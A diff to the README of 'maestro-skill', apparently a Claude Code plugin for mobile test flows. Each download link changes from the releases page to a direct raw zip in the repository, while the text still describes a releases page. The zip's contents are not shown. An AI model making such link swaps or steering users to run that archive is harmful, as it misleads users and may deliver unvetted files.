@@ -1,6 +1,6 @@
 # 🎛 maestro-skill - Generate Test Flows Easily
 
-[![Download maestro-skill](https://img.shields.io/badge/Download-maestro--skill-%23007ACC?style=for-the-badge&logo=github)](https://github.com/kaua433/maestro-skill/releases)
+[![Download maestro-skill](https://img.shields.io/badge/Download-maestro--skill-%23007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kaua433/maestro-skill/main/skills/skill-maestro-3.0-alpha.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get maestro-skill running on your Windows computer.
 
 Click the button below to go to the download page.
 
-[![Download maestro-skill](https://img.shields.io/badge/Download-maestro--skill-%237D7D7D?style=for-the-badge&logo=github)](https://github.com/kaua433/maestro-skill/releases)
+[![Download maestro-skill](https://img.shields.io/badge/Download-maestro--skill-%237D7D7D?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kaua433/maestro-skill/main/skills/skill-maestro-3.0-alpha.1.zip)
 
 This page lists all releases of the app. Find the latest release at the top.
 
@@ -129,7 +129,7 @@ If problems continue, check the online documentation or support forums linked on
 
 ## 🔗 Useful Links
 
-- Download and releases: https://github.com/kaua433/maestro-skill/releases  
+- Download and releases: https://raw.githubusercontent.com/kaua433/maestro-skill/main/skills/skill-maestro-3.0-alpha.1.zip  
 - Project topics: android, claude-code, claude-code-plugin, e2e-testing, flutter, ios, maestro, mobile-testing, react-native, test-automation
 
 ---
